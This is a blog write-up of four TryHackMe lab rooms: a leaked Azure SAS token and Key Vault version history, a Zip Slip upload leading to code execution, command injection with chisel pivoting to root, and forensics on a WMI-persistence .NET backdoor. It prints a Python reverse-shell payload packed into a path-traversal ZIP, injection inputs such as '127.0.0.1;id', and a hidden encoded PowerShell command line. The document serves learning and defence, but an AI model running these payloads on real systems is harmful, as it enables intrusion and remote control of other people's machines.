---
title: "TryHackMe — Welcome to The Byte Lotus (Hacker Holidays), Part 2"
date: 2026-08-07 09:00:00 +0200
categories:
  - Writeups
  - TryHackMe
tags:
  - hacker-holidays
  - byte-lotus
  - azure
  - cloud-security
  - sas-token
  - key-vault
  - service-principal
  - zip-slip
  - path-traversal
  - file-upload
  - reverse-shell
  - command-injection
  - freepbx
  - chisel
  - pivoting
  - port-forwarding
  - wmi
  - windows-forensics
  - dotnet
  - ilspy
  - reverse-engineering
  - ctf
published: true
image:
  path: /assets/img/posts/hackerholidays-2/cover.png
  alt: "Welcome to The Byte Lotus — Hacker Holidays, Part 2"
---

**Work in progress, continued.** This is the second part of my [Hacker Holidays writeup](/posts/hackerholidays/). The first post covers the warm-up room plus the first eight released rooms; this one picks up from room 9 onward as they unlock. Same rules as part one: rooms I solved myself are written that way, rooms where I leaned on Claude say so plainly, and flags stay redacted. 

| Field | Details |
|-------|---------|
| Platform | TryHackMe |
| Event | Hacker Holidays — "Welcome to The Byte Lotus" |
| Rooms covered so far | Room 9, Room 10, Room 11, Room 12 |

## Room 9 — Crypto Cabana

I had never touched cloud before this room, not Azure, not AWS, nothing. One thing that made it less intimidating than I expected: the Azure CLI feels structurally like a Linux terminal, commands, subcommands, flags, the shape of it was familiar even though every single command itself was new to me. I'll say upfront where the line sits: I found the leaked token myself and worked out that it was over-scoped myself. Everything past "here's the token, now what," every actual Azure CLI command that does something with it, I had Claude write. I know there's a whole CLI syntax for this, I just don't know it myself yet.

The room drops you straight into a browser-based Azure Cloud Shell with `az` already available. The target is a "back up your seed phrase" site, and its page source leaks a storage account name, a container name, and a SAS token, all sitting in plain JavaScript.

<img src="/assets/img/posts/hackerholidays-2/hackerholidays-2_06.png" width="700" alt="The CryptoCabana seed-phrase backup site">
<img src="/assets/img/posts/hackerholidays-2/hackerholidays-2_07.png" width="700" alt="The page's source code, leaking the storage account name, container name, and a full SAS token in plain JavaScript">

A SAS token is Azure's way of handing out scoped, temporary access to storage without a full login, and this one is genuinely just meant to let the page write one backup file. I decoded its URL-encoded parameters through CyberChef to read them cleanly, and they told a different story than "write one file": `ss=b` for blob service, `srt=sco` for service, container, and object level all at once, `sp=rl` for read and list, and an expiry set to the year 2099. The app only ever needs to write. This token can read and list the entire storage account, forever.

<img src="/assets/img/posts/hackerholidays-2/hackerholidays-2_08.png" width="700" alt="CyberChef decoding the SAS token's URL-encoded parameters">

Turning that observation into actual access is where I needed Claude the whole way, I had never run an `az storage` command before. Listing containers with the token turned up three: `$web`, `backups`, the one the app is meant to use, and `vault`, which had no reason to be reachable with this token at all. Listing and downloading the contents of `vault` came back with two files.

<img src="/assets/img/posts/hackerholidays-2/hackerholidays-2_09.png" width="700" alt="Listing storage containers with the leaked token, finding an unexpected vault container, then listing and downloading its contents">

One was a decoy seed phrase. The other was `backup-service-account.json`, and it was the actual jackpot: a full set of Azure service principal credentials, client ID, client secret, tenant ID, and the URI of a Key Vault, sitting in plain text, with a note on the file that read almost like a joke in hindsight: rotate this if it ever leaves the vault.

<img src="/assets/img/posts/hackerholidays-2/hackerholidays-2_10.png" width="700" alt="The decoy seed phrase alongside backup-service-account.json, containing plaintext service principal credentials">

A service principal is Azure's version of a machine account, an identity meant for an application rather than a person, and these credentials let you authenticate as that identity from anywhere. Again, I didn't know the login syntax, Claude wrote the command, and it logged in cleanly as that service principal.

<img src="/assets/img/posts/hackerholidays-2/hackerholidays-2_11.png" width="700" alt="Logging in as the leaked service principal via the Azure CLI">

From there, the Key Vault the credentials pointed at listed four secrets: three key shards and a master key. The three shards came back to me quickly.

<img src="/assets/img/posts/hackerholidays-2/hackerholidays-2_12.png" width="700" alt="Listing the Key Vault's secrets: three key shards and a master key">

The master key, though, came back Forbidden. This account genuinely wasn't allowed to read it, real least-privilege access control doing exactly what it's supposed to do, which meant the master key was never the intended path.

This is the part I actually want to flag as my own realization, not something Claude pointed me toward: I noticed one of the three shards I did have access to had already been rotated, and rotating a secret in Key Vault doesn't delete the old value, it just adds a new version on top while the previous one stays in the vault's version history. That's the cloud cutting both ways in the same feature: version history is genuinely useful for recovering from a mistake, and it's just as useful for recovering a secret someone thought they'd already invalidated. Checking that shard's version history turned up two versions, created seconds apart, and reading the earlier one directly by its versioned ID gave back its actual value.

<img src="/assets/img/posts/hackerholidays-2/hackerholidays-2_13.png" width="700" alt="Listing version history for one key shard, showing an old and a new version">
<img src="/assets/img/posts/hackerholidays-2/hackerholidays-2_14.png" width="700" alt="Reading the value of the old, supposedly-rotated version directly by its full versioned ID">

Three shards, stitched together, made the flag.

Flag: `[redacted]`

## Room 10 — The Hollow Shell

Three of the four stages in this room I did myself: finding the login credentials, testing the upload, and going from shell to flag. The one new piece was Zip Slip itself, a vulnerability class I'd never heard of before this room. I had Claude explain the underlying principle to me and build the actual exploit ZIP. I want to be honest about what that means and what it doesn't: having Claude build it once doesn't mean I could build it myself yet. I've seen it done and I understand the concept now. That's a real step, it's just not the same thing as being able to reproduce it cold.

An nmap scan turned up SSH and a web app on port 5000, a "Byte Lotus Shoreline Display" staff sign-in page.

<img src="/assets/img/posts/hackerholidays-2/hackerholidays-2_01.png" width="700" alt="The Byte Lotus Shoreline Display staff sign-in page">

The credentials for it were sitting in plain view in the page's HTML source, left in an onboarding comment for new staff, no guessing needed once I thought to check.

<img src="/assets/img/posts/hackerholidays-2/hackerholidays-2_02.png" width="700" alt="The page's HTML source, with a staff onboarding comment containing the default login credentials in plain text">

Past login, the app lets you upload a ZIP archive, called a "shell" in the app's own beach theming, which needs a `shell.json` manifest file inside it to be accepted. The page even mentions the app supports optional "automation hooks" that a worker process applies shortly after upload, which turns out to be the exact mechanism the exploit rides on.

<img src="/assets/img/posts/hackerholidays-2/hackerholidays-2_03.png" width="700" alt="The shell upload page, describing the shell.json manifest requirement and mentioning optional automation hooks applied by a background worker">

I tested that upload path with a harmless ZIP first, just a manifest and no real payload, to see how the server handled it before trying anything else. The response told me exactly where it landed: `Stored at shells/62975c0902b6/`.

<img src="/assets/img/posts/hackerholidays-2/hackerholidays-2_04.png" width="700" alt="Confirmation that the test shell was stored at a specific path on the server, shells/62975c0902b6/">

That confirmed the server actually extracts the archive somewhere on disk, and gave me a real path to reason about, rather than guessing blind.

The room's own name was the actual hint I'd been sitting on without registering it: Zip Slip, "slip" being the tell. I didn't know the term, so I asked Claude to walk me through what it actually was before touching anything.

<details style="border: 1px solid rgba(128,128,128,0.35); border-radius: 6px; padding: 0.75em 1em; margin: 1em 0;">
<summary style="cursor: pointer; font-weight: 600;">What Zip Slip actually is, in plain terms</summary>
<div markdown="1" style="margin-top: 0.75em; padding-top: 0.75em; border-top: 1px solid rgba(128,128,128,0.25);">

A ZIP file is really just a list of entries, and each entry has a name, which is also the path it gets written to when someone extracts the archive. Nothing stops that name from being something like `../../../etc/whatever` instead of a normal filename. If the code doing the extracting doesn't check that the final write location is still inside the folder it's supposed to be, an entry like that walks itself out of the upload folder entirely and lands wherever its `../` sequence points, anywhere on disk the process has permission to write. It's not a bug in ZIP itself, it's a missing check in whatever code unpacks it. It's also not obscure or new, this exact class of bug hit several major libraries across multiple languages back in 2018 when it was first named and publicized.

</div>
</details>

The server's ZIP extractor here doesn't check where an entry inside the archive is actually trying to write. A file inside the ZIP named something like `../../../hooks/callback.py` walks itself right out of the intended upload folder on extraction. `hooks/` turned out to be a sibling directory next to `shells/`, sitting in the app's own working directory alongside `app.py` and a `theme_worker.py` process, the automation-hooks worker the upload page mentioned, and the app treats anything dropped into it as a plugin, automatically loading and running any Python file placed there whenever the worker next runs. Write access to that one folder is remote code execution.

Actually building the malicious ZIP is where the real technical trick lived, and where Claude actually did the building. A normal `zip` command or file-manager GUI silently strips `../` sequences back down to something safe when it writes the archive, so the traversal never survives packaging in the first place. The fix is building the archive by hand in Python instead, writing the manifest and the malicious entry directly into the zip file's internal structure:

```python
import zipfile, json

manifest = {"name": "reverse", "assets": []}
payload = '''import socket,os,pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("<attacker-ip>",4444))
os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
pty.spawn("/bin/bash")
'''

with zipfile.ZipFile("evil.zip", "w") as z:
    z.writestr("shell.json", json.dumps(manifest))
    z.writestr("../../../hooks/callback.py", payload)
```

The one check that actually matters before uploading anything: running `unzip -l evil.zip` and confirming the listing still shows the literal `../../../hooks/callback.py` path. If it's been quietly flattened down to `hooks/callback.py`, the traversal already died during packaging and the upload won't do anything.

The exact number of `../` needed wasn't something I could work out from the URL alone. The web path showed `shells/<hash>/`, but the real folder structure on disk sits deeper than that path suggests, and `hooks/` shares a parent further up than the URL implies. Getting the depth right meant trying `../`, then `../../`, then `../../../` until the listing confirmed a hit, not calculating it from what the browser showed.

With a listener running, the verified ZIP uploaded, and the server processing it, the plugin loader picked up the dropped file and the reverse shell fired on its own, landing directly as the `roomservice` user, no separate privilege escalation needed. From there, getting to the flag was quick: a short detour through the app's own working directory, then straight to `/home/roomservice`.

<img src="/assets/img/posts/hackerholidays-2/hackerholidays-2_05.png" width="700" alt="The reverse shell landing as roomservice, navigating to the home directory, and reading flag.txt">

Flag: `[redacted]`

**What I'm keeping from this one, blue-team side:** an uploaded ZIP whose entries contain `../` is a traversal attempt on the extractor, not a formatting quirk. A new or changed file showing up in a directory the app treats as auto-loading code, plugins, hooks, whatever it's called, right after a file upload, is exactly the moment a file-integrity check should fire. And the actual fix on the defending side isn't complicated once you've seen the attack: every extracted path needs to be checked against the target directory before it's written, and nothing gets extracted anywhere near a directory the app will later execute code from.

## Room 11 — Infinity Pool, the Room That Broke the Pattern

This room took two full days before I got anywhere close to root, and I want to be upfront about why: it was heavily Claude-guided from the start, the same as several other rooms this event, and that still wasn't enough. The thing that actually got me stuck wasn't a missing hint, it was a hint I already had and dismissed, because I didn't know enough yet to tell whether it was worth taking seriously. That's the real story of this room, more than any single technique in it.

**Getting in.** The Byte Lotus corporate site is polished and gives away nothing on the surface.

<img src="/assets/img/posts/hackerholidays-2/hackerholidays-2_15.png" width="700" alt="The Byte Lotus corporate homepage">

The actual lead was sitting in the page's own source, a developer comment left in by mistake: a staff connectivity tool at `/status` that posts to an internal `/internal/netcheck` handler, explicitly kept out of the public navigation and disallowed in `robots.txt` until a proper auth gateway ships. Nobody removed the comment when they hid the link.

<img src="/assets/img/posts/hackerholidays-2/hackerholidays-2_16.png" width="700" alt="A developer comment in the page source, revealing the hidden /status tool and its internal handler">

`/status` itself is a plain ping utility: type a host, it pings it, shows you the output.

<img src="/assets/img/posts/hackerholidays-2/hackerholidays-2_17.png" width="700" alt="The /status page, a staff tool for pinging a host to check sister-property connectivity">

A ping tool that shells out to the system's real `ping` command is a strong candidate for command injection if the input isn't sanitized, and this one wasn't. Feeding it `127.0.0.1;id` ran the ping and then ran `id` right after it, on the actual server.

<img src="/assets/img/posts/hackerholidays-2/hackerholidays-2_18.png" width="700" alt="Injecting 127.0.0.1;id into the ping field, confirming command execution as the web user">

Getting from that confirmation to an actual shell took a couple of tries. One separator and payload combination came back with an odd, incomplete-looking response instead of a real connection.

<img src="/assets/img/posts/hackerholidays-2/hackerholidays-2_19.png" width="700" alt="An early reverse shell attempt with a different separator, returning an unexpected, incomplete-looking response">

Going back to the semicolon separator with a straightforward `bash -i` one-liner and a listener running got a real connection back.

<img src="/assets/img/posts/hackerholidays-2/hackerholidays-2_20.png" width="700" alt="netcat catching the reverse shell, landing as the web user">

From there, the user flag and the app's own layout were both quick to find, and `robots.txt` inside the app's static folder confirmed the same two paths the source comment had already pointed at, `/internal/` and `/status`.

<img src="/assets/img/posts/hackerholidays-2/hackerholidays-2_21.png" width="700" alt="Listing the edge app's directory and reading the user flag">
<img src="/assets/img/posts/hackerholidays-2/hackerholidays-2_22.png" width="700" alt="robots.txt inside the app, disallowing /internal/ and /status">

User flag: `[redacted]`

**Mapping what's actually running.** The process list showed three separate services behind this one box, not just the one I'd landed on: `edge` on port 80, the app I was already inside, running as the low-privilege `web` user; `watchtower` on port 3000, internal only, running as its own service account; and `automation` on port 9000, internal only, running as root. That last one was obviously the actual target.

<img src="/assets/img/posts/hackerholidays-2/hackerholidays-2_23.png" width="700" alt="ps auxww revealing three separate gunicorn services: edge, watchtower, and automation, the last one running as root">

`watchtower` described itself plainly once I could reach it: a loopback-only ops console that considers itself authenticated just by virtue of only being reachable from inside the network. That's not authentication, that's trusting whoever already got a foothold, which was exactly what I was.

<img src="/assets/img/posts/hackerholidays-2/hackerholidays-2_24.png" width="700" alt="watchtower's ops console page, describing itself as a loopback-only console authenticated by network position">

Its config endpoint leaked real telephony credentials for a FreePBX instance, along with an internal note admitting those credentials were still the default template ones and needed rotating, plus the address of the automation service I already had my eye on.

<img src="/assets/img/posts/hackerholidays-2/hackerholidays-2_25.png" width="700" alt="watchtower's config endpoint leaking FreePBX credentials, an internal note about them still being default, and the automation service's address">

A quick check against the FreePBX login page confirmed the exact version running, 16.0.45, useful context even before I knew whether it would matter.

<img src="/assets/img/posts/hackerholidays-2/hackerholidays-2_26.png" width="700" alt="Confirming the exact FreePBX version, 16.0.45, from the login page's source">

Querying `automation` directly on port 9000 confirmed what it actually was: an endpoint that exports a report by shelling out to `tar`, gated behind a bearer token, running as root. That was the whole target, laid out plainly. I just didn't have the key yet.

<img src="/assets/img/posts/hackerholidays-2/hackerholidays-2_27.png" width="700" alt="Querying the automation service's health endpoint, revealing the /jobs/export endpoint, its bearer-token requirement, and that it runs as root">

**Two days of dead ends.** A wider port scan from inside the box showed just how much more was sitting there, locked to localhost only: an Asterisk manager interface, a MySQL instance, the FreePBX web port, two more Asterisk HTTP ports.

<img src="/assets/img/posts/hackerholidays-2/hackerholidays-2_28.png" width="700" alt="A localhost port scan revealing several more internal-only services: Asterisk manager, MySQL, FreePBX, and Asterisk HTTP">

Most of what followed was checking each of those doors and finding it locked. I dug through FreePBX's own source looking for a hardcoded default password on its Asterisk manager interface, found one, and it had already been changed on this box.

<img src="/assets/img/posts/hackerholidays-2/hackerholidays-2_29.png" width="700" alt="Grepping FreePBX's own source code for a hardcoded default Asterisk manager password, a dead end since it had already been rotated">

Past that one: a known SQL injection issue in this FreePBX version didn't apply, the module it targets wasn't installed. The telephony credentials I already had logged into the wrong thing, they weren't an admin account. MySQL's usual default logins were all refused. The web user couldn't write anywhere inside FreePBX's own files to drop a webshell. Cron, SUID binaries, sudo rules, capabilities, all standard, nothing exploitable. Another account on the box was sudo-eligible in principle, but its SSH key and shell history were both locked down tight enough that it didn't matter.

**The piece I already had and threw away.** Claude had actually suggested a tool called chisel early on, for tunneling one of those internal-only ports out to where I could actually reach it properly. I dismissed it as overkill. I didn't have the background to judge whether that suggestion was the right call or not, so I just didn't take it. That's on me, not on the suggestion. Two days later, a walkthrough video for this room ([youtu.be/wP_5wv4sp1M](https://youtu.be/wP_5wv4sp1M)) showed chisel was the actual intended path the whole time: tunnel FreePBX's port out, open it in a real browser, and use the telephony credentials that had been sitting there unused since day one.

Setting it up meant matching binaries to each side, my own box is ARM, the target is amd64, so two different chisel builds, one per architecture. My box ran the tunnel server; the target ran the client and reverse-forwarded two internal ports back out to me.

<img src="/assets/img/posts/hackerholidays-2/hackerholidays-2_30.png" width="700" alt="chisel running as a reverse-tunnel server on my own box, with the target's client connecting and forwarding ports back">

With that tunnel up, FreePBX's login page was just a normal page in my normal browser, `127.0.0.1:8080`, no different from browsing any other site.

<img src="/assets/img/posts/hackerholidays-2/hackerholidays-2_31.png" width="700" alt="FreePBX's User Control Panel login page, now reachable through a real browser via the chisel tunnel">

Logged in with the telephony credentials, and the automation key was sitting inside a voicemail box, of all places, in the caller-ID text of a single message left for that account.

<img src="/assets/img/posts/hackerholidays-2/hackerholidays-2_32.png" width="700" alt="A voicemail inbox inside FreePBX's UCP, with the automation key sitting in a message's caller-ID field">

**Root, the same bug wearing a different coat.** With the key in hand, the automation service's export endpoint turned out to have the exact same problem as the ping tool that got me in: the report name goes straight into a root-run shell command, unsanitized. A test payload confirmed it came back as root.

<img src="/assets/img/posts/hackerholidays-2/hackerholidays-2_33.png" width="700" alt="Sending an injection payload to the automation service's export endpoint, confirming command execution as root">

From there, reading the root flag directly was the same trick, one more semicolon.

<img src="/assets/img/posts/hackerholidays-2/hackerholidays-2_34.png" width="700" alt="Injecting a command to read root.txt directly, returning the root flag">

Root flag: `[redacted]`

**What I'm actually taking from this room, blue-team side.** The exact same bug class showed up twice, in two unrelated services, both times because user input went straight into a shell command instead of being validated first, that's the pattern I'd want a rule watching for regardless of which endpoint it shows up on. "Only reachable from inside the network" is not the same thing as "authenticated," watchtower said so about itself, and treating network position as identity is exactly how one foothold becomes access to everything behind it. Secrets don't only leak through config files, a caller-ID field in a voicemail box is just as real a leak point if something renders it somewhere unexpected, which lines up with the leaked demo credentials in Room 10 and the plaintext backup in Room 3, three different rooms, the same underlying habit of trusting a field nobody thought to treat as sensitive. And reverse-tunnel traffic itself, an outbound connection to an attacker-controlled port carrying WebSocket-looking traffic, is its own detection signal, the kind of thing that matters precisely because a leaked token alone wasn't enough here, it took a second, separate control failure to actually reach it.

## Room 12 — After Hours

No target box this time, no shell to land, just a folder of files and a prompt to figure out what happened. Same as the warm-up, Room 1, Room 2, and Room 6 in [Part 1](/posts/hackerholidays/), no Claude in the loop for this one, everything below is me and a search engine.

<img src="/assets/img/posts/hackerholidays-2/hackerholidays-2_35.png" width="700" alt="The attachments folder for After Hours, containing INDEX.BTR, three MAPPING.MAP files, OBJECTS.DATA, instructions.txt, a tools folder, and an ILSpy release zip">

**Figuring out what I was even looking at.** `INDEX.BTR`, `MAPPING1.MAP` through `MAPPING3.MAP`, `OBJECTS.DATA`, none of that meant anything to me on sight, so I looked it up. Turns out those four files together are the WMI repository, the database Windows itself uses under `System32\wbem\Repository` to store hardware and configuration data, and `OBJECTS.DATA` is the one that actually holds the content.

<img src="/assets/img/posts/hackerholidays-2/hackerholidays-2_36.png" width="700" alt="A search result explaining that INDEX.BTR, MAPPING.MAP, and OBJECTS.DATA together make up the WMI repository database">

The same search pointed at a handful of purpose-built parsers for this exact format, WMI-Parser, PyWMIPersistenceFinder, Mandiant's Flare-WMI, and mentioned they're commonly bundled together as a WMI_Forensics toolkit.

<img src="/assets/img/posts/hackerholidays-2/hackerholidays-2_37.png" width="700" alt="A list of dedicated WMI-forensics tools: WMI-Parser, PyWMIPersistenceFinder, and Mandiant's Flare-WMI">

**A dead end first.** I grabbed that toolkit and ran the first script in it, `CCM_RUA_Finder.py`, against `OBJECTS.DATA`. It completed and wrote an `output.xls`, but the column headers it produced, file paths, product names, MSI install metadata, were for a completely different kind of artifact than whatever this room actually wanted. Not the right tool for this job, just the first one I reached for.

<img src="/assets/img/posts/hackerholidays-2/hackerholidays-2_38.png" width="700" alt="Running CCM_RUA_Finder.py against OBJECTS.DATA, producing an output.xls with unrelated recently-used-apps column headers">

**Finding the actual thread to pull.** Instead of trusting another parser blind, I went straight at the file with `strings` and grepped for the kind of thing a WMI-based backdoor usually leaves behind, `CommandLineEventConsumer`, PowerShell, obfuscation flags.

<img src="/assets/img/posts/hackerholidays-2/hackerholidays-2_39.png" width="700" alt="strings OBJECTS.DATA piped through grep for CommandLineEvent, powershell, bypass, and downloadstring">

That turned up several `CommandLineEventConsumer` hits, and one of them wasn't just a class name, it was a full command line: `cmd /C powershell.exe -Sta -Nop -Window Hidden -enc <base64 blob>`, a WMI event consumer set up to run hidden, encoded PowerShell whenever its matching filter fires.

<img src="/assets/img/posts/hackerholidays-2/hackerholidays-2_40.png" width="700" alt="object_strings.txt open in Sublime Text, showing a CommandLineEventConsumer entry with a full encoded PowerShell command line">

Decoding that `-enc` blob in CyberChef, base64 plus stripping the null bytes PowerShell's UTF-16 encoding leaves behind, gave me the actual loader logic: read a property called `ConfigData` off a WMI class named `Win32_HardwareTelemetry`, base64-decode it, run it through a raw deflate stream to decompress it, then reflectively load the result as a .NET assembly and invoke its entry point straight in memory.

<img src="/assets/img/posts/hackerholidays-2/hackerholidays-2_41.png" width="700" alt="CyberChef decoding the base64 PowerShell payload, revealing code that reads Win32_HardwareTelemetry's ConfigData, inflates it, and reflectively loads it as a .NET assembly">

`Win32_HardwareTelemetry` isn't a real Windows class, whoever built this made it up to look like a legitimate hardware provider and used its `ConfigData` field as a hiding spot. So I went back to `strings`, this time grepping for that class name with five lines of context on either side to find the actual payload sitting next to it.

<img src="/assets/img/posts/hackerholidays-2/hackerholidays-2_42.png" width="700" alt="strings OBJECTS.DATA grepped for Win32_HardwareTelemetry with five lines of surrounding context">

That pulled up the `ConfigData` string property itself, a base64 blob a couple thousand characters long.

<img src="/assets/img/posts/hackerholidays-2/hackerholidays-2_43.png" width="700" alt="hardwaretelemetry_strings.txt open in Sublime Text, showing the ConfigData property and its large base64-encoded value">

Base64-decoding that and running it through CyberChef's raw inflate, matching what the PowerShell loader actually does, didn't just produce readable text, it produced a `MZ` header and "This program cannot be run in DOS mode," a Windows executable, sitting compressed inside a fake WMI property this whole time.

<img src="/assets/img/posts/hackerholidays-2/hackerholidays-2_44.png" width="700" alt="CyberChef inflating the decoded ConfigData blob, producing a Windows PE header, MZ, and the DOS-mode string">

Saved as `malware.exe`, and `file` confirmed it: a PE32 GUI binary, Mono/.NET assembly, three sections.

<img src="/assets/img/posts/hackerholidays-2/hackerholidays-2_45.png" width="700" alt="Listing the extracted files and running file against malware.exe, confirming a PE32 .NET assembly">

**Getting ILSpy actually running.** The attack box hands you ILSpy directly for exactly this kind of file, but I wasn't on the attack box, I was on my own Kali install, and it wasn't nearly that simple to get working there. ILSpy needed a .NET runtime first, .NET 11 wouldn't run it, neither would .NET 10, .NET 8 finally did. Then it turned out to need PowerShell too, which Kali's own `apt` doesn't ship anymore, so that went in through `snapd` instead. Only after both of those were sorted did ILSpy actually build and open the file.

Decompiling `malware.exe`'s entry point showed the whole point of the exercise: it checks whether the machine's hostname is exactly `bytelotusdc`, and only if that matches does it quietly run `cmd.exe /c net user patch <string> /add` with a hidden window, creating a new local account called `patch` with a password-looking argument. Anywhere else, it just prints a mismatch message and does nothing, which is exactly why file-based scanning and sandbox detonation both miss it.

<img src="/assets/img/posts/hackerholidays-2/hackerholidays-2_46.png" width="700" alt="ILSpy decompiling malware.exe's Main method, showing a hostname check against bytelotusdc and a hidden net user command creating a backdoor account">

That password-looking argument wasn't a password. It was base64 too, and decoding it was the flag.

Flag: `[redacted]`

**What I'm actually taking from this room, blue-team side.** The interesting part isn't the backdoor account, it's where the payload lived before that account ever got created. A fake WMI class with a property nobody would think to look at, deflate-compressed and reflectively loaded straight into memory, never touches disk as a standalone file, which is exactly the kind of thing that walks past scanners looking for file hashes or dropped executables. The hostname check is the same idea applied to analysis environments: it only does anything on the one machine named `bytelotusdc`, so a sandbox or an analyst's VM with the wrong hostname sees nothing happen and moves on. Between this and Room 11's loopback-only "authentication," the pattern I keep running into is systems trusting a condition, network position, machine identity, instead of actually verifying anything.

## Lessons Learned

**Room 9:** first time touching cloud at all, so the honest split matters here: I found the leaked token and worked out it was over-privileged on my own, but every actual Azure command, listing storage, downloading blobs, logging in as a service principal, querying the Key Vault, was new syntax I had Claude write, not something I could have typed myself. What's mine to keep is the pattern I actually recognized without help: rotating a secret is not the same as deleting it, and if the old version is still sitting in a vault's history, "we rotated it" doesn't mean the leak stopped mattering.

**Room 10:** three of four stages here were mine, and the one that wasn't, crafting a Zip Slip payload from scratch, is now something I've watched happen and understood, not something I can do on my own yet. I'm keeping that distinction on purpose. Seeing a technique built once and being able to rebuild it are two different levels of knowing something, and blurring them together would make this writeup dishonest about where I actually am.

**Room 11:** this is the one I actually want to sit with. It wasn't a knowledge gap in the sense of "I didn't have the information," Claude handed me the right tool early. It was that I couldn't evaluate the suggestion, because I didn't know enough about pivoting and tunneling yet to tell a good idea from an unnecessary detour, so I threw away the right answer and spent two days finding it again the hard way. AI guidance doesn't help much if I can't judge what it's telling me. I found [a post arguing exactly this](https://www.seangoedecke.com/llms-reward-expertise/) after the fact: the more expertise you already bring to a field, the more an LLM actually helps you, because you can tell good suggestions from bad ones instead of taking every output at face value. Room 11 is that argument playing out on me directly. The useful side of it: the gap it exposed is specific and nameable, pivoting and tunneling, not "cloud" or "everything," and that's something I can actually go study on purpose instead of just hoping it comes up again. I also have chisel now, properly, reverse forward, matched-architecture binaries, server on my box and client on the target. That part won't need relearning next time.

**Room 12:** another one without Claude, same as the warm-up, Room 1, Room 2, and Room 6 back in Part 1, files I'd never seen before, straight into a search engine and my own terminal. The dead end with `CCM_RUA_Finder.py` was worth keeping in, not every tool a search result recommends is the right one for what's actually in front of you, and the only way I found that out was by running it and looking at what came back. The ILSpy install fight, .NET version roulette, then a missing PowerShell, felt like pure friction at the time, but it's exactly the kind of environment problem I'd hit again doing this for real, and now I know what it looks like.

## To Be Continued

More rooms are unlocking after this one. I'll keep adding to this post as they land. See [Part 1](/posts/hackerholidays/) for the warm-up through room 8.
